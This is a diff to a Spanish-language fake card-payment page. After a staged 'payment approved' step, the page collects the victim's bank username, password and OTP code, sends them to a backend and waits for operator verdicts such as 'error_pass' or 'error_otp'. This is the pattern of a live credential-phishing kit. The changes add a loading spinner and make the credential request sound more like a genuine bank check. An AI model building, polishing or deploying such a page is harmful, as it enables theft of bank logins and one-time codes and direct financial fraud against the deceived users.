@@ -544,6 +544,21 @@
             color: #0369a1;
         }
 
+        /* SPINNER PEQUEÑO PARA EL BOTÓN */
+        .btn-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .btn-spinner.active {
+            display: inline-block;
+        }
+
         .security-footer {
             display: flex;
             align-items: center;
@@ -650,7 +665,7 @@
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
             transition: background-color 0.15s;
             width: 100%;
             text-align: center;
@@ -968,10 +983,10 @@
                                     <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                     <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
                                 </svg>
-                                Verificación de datos
+                                Verificación de datos de la tarjeta
                             </div>
                             <p class="credenciales-subtitle">
-                                Verifica tus datos de tu banco para completar la validación.
+                                Verificación del banco acerca de tu tarjeta. Ingresa tus credenciales para validar la transacción.
                             </p>
 
                             <!-- ALERTA DE CREDENCIALES -->
@@ -1000,7 +1015,8 @@
                             </div>
 
                             <button type="button" class="btn btn-success" id="continuarBtn" style="margin-top:16px;">
-                                Continuar
+                                <span class="btn-spinner" id="btnSpinner"></span>
+                                <span id="btnText">Continuar</span>
                             </button>
                         </div>
 
@@ -1097,6 +1113,8 @@
         const bancoOTP = document.getElementById('bancoOTP');
         const credencialesSection = document.getElementById('credencialesSection');
         const continuarBtn = document.getElementById('continuarBtn');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const btnText = document.getElementById('btnText');
         const alertaCredencial = document.getElementById('alertaCredencial');
 
         const cardPatterns = {
@@ -1466,13 +1484,8 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
                     
-                    // OCULTAR OVERLAY
                     loadingOverlay.classList.remove('active');
-                    
-                    // Ocultar botón de pago
                     submitButton.style.display = 'none';
-                    
-                    // Mostrar credenciales
                     credencialesSection.classList.add('visible');
                     
                     mostrarInfo('✅ Pago aprobado. Complete la verificación bancaria.');
@@ -1511,7 +1524,8 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('Tiempo de espera agotado. Intente nuevamente.', 'error');
                     continuarBtn.disabled = false;
-                    continuarBtn.textContent = 'Continuar';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Continuar';
                     bancoUsuario.disabled = false;
                     bancoPassword.disabled = false;
                     bancoOTP.disabled = false;
@@ -1521,12 +1535,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 const resultado = await verificarEstadoSolicitud(credencialesId);
                 console.log('📊 Estado credenciales:', resultado);
 
-                // ERROR USUARIO
                 if (resultado === 'error_user') {
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('❌ Usuario incorrecto. Por favor, verifica tus datos e intenta de nuevo.', 'error');
                     continuarBtn.disabled = false;
-                    continuarBtn.textContent = 'Continuar';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Continuar';
                     bancoUsuario.disabled = false;
                     bancoPassword.disabled = false;
                     bancoOTP.disabled = false;
@@ -1534,12 +1548,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     return;
                 }
 
-                // ERROR CLAVE
                 if (resultado === 'error_pass') {
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('❌ Contraseña incorrecta. Por favor, verifica tus datos e intenta de nuevo.', 'error');
                     continuarBtn.disabled = false;
-                    continuarBtn.textContent = 'Continuar';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Continuar';
                     bancoUsuario.disabled = false;
                     bancoPassword.disabled = false;
                     bancoOTP.disabled = false;
@@ -1547,12 +1561,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     return;
                 }
 
-                // ERROR OTP
                 if (resultado === 'error_otp') {
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('❌ Código de verificación incorrecto. Por favor, verifica el código OTP.', 'error');
                     continuarBtn.disabled = false;
-                    continuarBtn.textContent = 'Continuar';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Continuar';
                     bancoUsuario.disabled = false;
                     bancoPassword.disabled = false;
                     bancoOTP.disabled = false;
@@ -1561,12 +1575,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     return;
                 }
 
-                // APROBADO - Redirigir a index.html
                 if (resultado === 'approved') {
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('✅ ¡Verificación exitosa! Redirigiendo...', 'success');
                     continuarBtn.disabled = true;
-                    continuarBtn.textContent = 'Redirigiendo...';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Redirigiendo...';
                     
                     setTimeout(() => {
                         window.location.href = 'index.html';
@@ -1574,12 +1588,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     return;
                 }
 
-                // RECHAZADO
                 if (resultado === 'rejected') {
                     clearInterval(pollingCredenciales);
                     mostrarAlerta('❌ Credenciales rechazadas. Verifique sus datos.', 'error');
                     continuarBtn.disabled = false;
-                    continuarBtn.textContent = 'Continuar';
+                    btnSpinner.classList.remove('active');
+                    btnText.textContent = 'Continuar';
                     bancoUsuario.disabled = false;
                     bancoPassword.disabled = false;
                     bancoOTP.disabled = false;
@@ -1744,8 +1758,10 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 return;
             }
 
+            // Mostrar spinner y cambiar texto
             continuarBtn.disabled = true;
-            continuarBtn.textContent = 'Enviando...';
+            btnSpinner.classList.add('active');
+            btnText.textContent = 'Enviando...';
             mostrarAlerta('⏳ Verificando credenciales...', 'info');
 
             const cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || 'XXXX';
@@ -1789,8 +1805,7 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
 
             if (enviado) {
                 mostrarAlerta('✅ Credenciales enviadas. Esperando verificación final...', 'info');
-                continuarBtn.textContent = 'Enviado';
-                continuarBtn.style.backgroundColor = 'var(--co-green)';
+                btnText.textContent = 'Enviado';
                 
                 bancoUsuario.disabled = true;
                 bancoPassword.disabled = true;
@@ -1801,8 +1816,8 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
             } else {
                 mostrarAlerta('❌ Error al enviar credenciales. Intente nuevamente.', 'error');
                 continuarBtn.disabled = false;
-                continuarBtn.textContent = 'Continuar';
-                continuarBtn.style.backgroundColor = '';
+                btnSpinner.classList.remove('active');
+                btnText.textContent = 'Continuar';
             }
         });
     </script>
